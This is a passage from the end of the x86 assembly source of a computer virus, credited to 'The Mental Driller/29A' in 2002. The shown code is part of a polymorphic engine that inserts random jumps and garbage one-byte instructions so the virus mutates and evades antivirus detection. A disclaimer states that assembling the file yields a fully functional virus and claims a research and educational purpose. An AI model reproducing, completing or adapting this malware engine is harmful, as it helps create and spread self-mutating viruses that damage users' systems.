
       @@DirectTEST:
                mov     eax, 48h      ; The direct test is TEST EAX,xxxx
                mov     [edi], eax
                xor     eax, eax
                call    Xpand_ReverseTranslation
                mov     [edi+1], eax
                call  @@GetARandomPowerOf2 ; Get a 2^rnd number (only one
                mov     [edi+7], edx       ; bit set)
                add     edi, 10h
                jmp   @@SetTheJump

      @@Normal: xor     eax, eax      ; If we don't make this, we set the jump
                mov     [ebp+Poly_JumpRandomExecution], eax ; to complete to
                ret                                         ; 0 and we exit.

   @@GetARandomPowerOf2:           ; A 2^rnd number is achieved by getting
                call    Random     ; a random number from 0 to 31 and then
                and     eax, 1Fh   ; shifting 1 by that number. Easy :).
                mov     edx, 1
       @@LoopRotate:
                or      eax, eax
                jz    @@RotateFinish
                shl     edx, 1
                sub     eax, 1
                jmp   @@LoopRotate
       @@RotateFinish:
                ret
Poly_MakeRandomExecution endp

;; Get a garbage one-byte instruction.
Poly_GetGarbageOneByter proc
                call    Random      ; Get a random number from 0 to 7
                and     eax, 7
                add     eax, 0F8h   ; Add F8 to get some interesting instrc.
                cmp     eax, 0FAh   ; CLI?
                jz    @@ReturnCMC   ; Then set CMC
                cmp     eax, 0FDh   ; STD?
                jz    @@ReturnNOP   ; Then set NOP (bad things happen if not!)
                cmp     eax, 0FEh   ; Other type of opcodes?
                jb    @@Return      ; If not, return the opcode
     @@ReturnNOP:
                mov     eax, 90h    ; Set NOP
     @@Return:  ret
     @@ReturnCMC:
                mov     eax, 0F5h   ; Set CMC
                ret
Poly_GetGarbageOneByter endp
;;
;;
;; End of the polymorphic engine
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


EndOfCode       label   dword

                end     PreMain

(c) The Mental Driller/29A, somewhere on February 2002

DISCLAIMER

This code is only for research and educational purposes only. The assembling
of this file will produce a fully functional virus, so you have been warned.
If this kind of material is illegal in your country or state, you should
remove it from your computer. The author of this virus declines any illegal
activity performed by the possesor of the assembled form of this source code
including possesion and/or spreading of the virus generated from this source
code.

This source code is provided "as is". The deliberated modification of this
source code will derive in a new virus that must not be considered the virus
sourced here. The author of the original source code will not be considered
the author of the new modified or derivated virus.
